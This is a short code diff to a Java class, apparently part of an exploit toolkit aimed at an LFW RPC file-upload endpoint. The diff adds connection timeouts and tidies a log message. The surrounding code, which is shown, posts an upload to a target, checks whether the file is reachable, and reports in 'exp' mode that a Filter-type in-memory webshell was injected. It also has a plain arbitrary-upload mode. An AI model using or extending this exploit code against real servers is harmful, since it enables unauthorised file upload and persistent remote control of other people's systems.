@@ -62,6 +62,9 @@ public class Lfw_Core_Rpc_Upload extends VulnBase {
             HttpURLConnection conn1 = (HttpURLConnection) apiUrl.openConnection();
             conn1.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
 
+            // 设置超时
+            HttpUtil.setTimeout(conn1);
+
             byte[] input = postData.getBytes("UTF-8");
             HttpUtil.post(conn1, input);
 
@@ -77,6 +80,9 @@ public class Lfw_Core_Rpc_Upload extends VulnBase {
                 URL fileUrl = new URL(Config.TARGET + "/" + filename);
                 HttpURLConnection conn2 = (HttpURLConnection) fileUrl.openConnection();
 
+                // 设置超时
+                HttpUtil.setTimeout(conn2);
+
                 // get请求
                 HttpUtil.get(conn2);
 
@@ -90,7 +96,7 @@ public class Lfw_Core_Rpc_Upload extends VulnBase {
                     if (response2.contains(flag) && Config.MOD.equals("poc")) {
                         logMessage("[+] 漏洞存在! 成功上传测试文件: " + fileUrl);
                     } else if (response2.contains(flag) && Config.MOD.equals("exp")) {
-                        logMessage("[+] Filter类型内存马注入成功, 请手动连接验证.");
+                        logMessage("[+] Filter 类型内存马注入成功, 请手动连接验证.");
                     } else if (Config.MOD.equals("upload")) {
                         logUpload("[+] 文件上传成功! 文件地址: " + fileUrl);
                     }
